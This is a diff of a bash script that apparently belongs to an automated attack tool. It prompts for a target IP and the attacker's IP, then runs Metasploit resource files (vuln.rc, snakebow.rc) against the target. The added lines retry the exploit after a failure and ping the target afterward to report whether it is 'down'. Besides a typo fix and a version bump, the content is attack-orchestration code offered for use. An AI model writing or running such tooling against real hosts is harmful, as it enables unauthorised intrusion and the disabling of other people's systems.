@@ -7,7 +7,8 @@ sleep 2.4
 if [ $( figlet rainblue | wc -c ) -eq "0" ]; then   # REQUIREMENTS CHECK
    clear
    sleep 1
-   echo " Dependencied Not Installed , Performing Automatic Installation !"
+   echo " Dependencies Not Installed , Performing Automatic Installation !"
+   sleep 3
    apt install -y figlet curl
 else
    echo " Dependencies Satisfied !"
@@ -25,7 +26,7 @@ while [ $i -le 22 ]; do
 done
 echo -e "\t\t\t\t\t  By Khusi-docker & PhiVault" 
 echo -e "\t\t\t\t\t  GitHub Khusi-docker - \e[34mhttps://github.com/Khusi-docker\e[0m"
-echo -e "\t\t\t\t\t  GitHub PhiVault - \e[34mhttps://github.com/PhiVault\e[0m.  V1.1"
+echo -e "\t\t\t\t\t  GitHub PhiVault - \e[34mhttps://github.com/PhiVault\e[0m.  V1.2"
 
 read -p "Enter Target IP -> " tip
 read -p "Enter Your IP -> " vic
@@ -65,7 +66,20 @@ if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
             echo -e "\n\e[34m Attack Completed , < Target Down > !\e[0m"
          fi
       else
-         echo -e "\nSorry The Target is Patched !"
+         echo -e "\nAttack Failed ! \n\n\e[32m Reattempting , Please Wait\n\e[31m"
+         vcheck=$( msfconsole -q -r vuln.rc | grep -o "WIN" | wc -c ) 
+         if [ $vcheck -eq "4" ]; then
+             msfconsole -r snakebow.rc
+             echo -e "\n Monitoring Target Behaviour , Please Wait!"
+             sleep 11
+             if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
+                echo -e "\n\e[34m Attack Completed , Target Up \e[0m"
+             else
+                echo -e "\n\e[34m Attack Completed , < Target Down > !\e[0m"
+             fi
+         else
+             echo -e "\n Attack Failed !"
+         fi
       fi
    else
       sleep 1
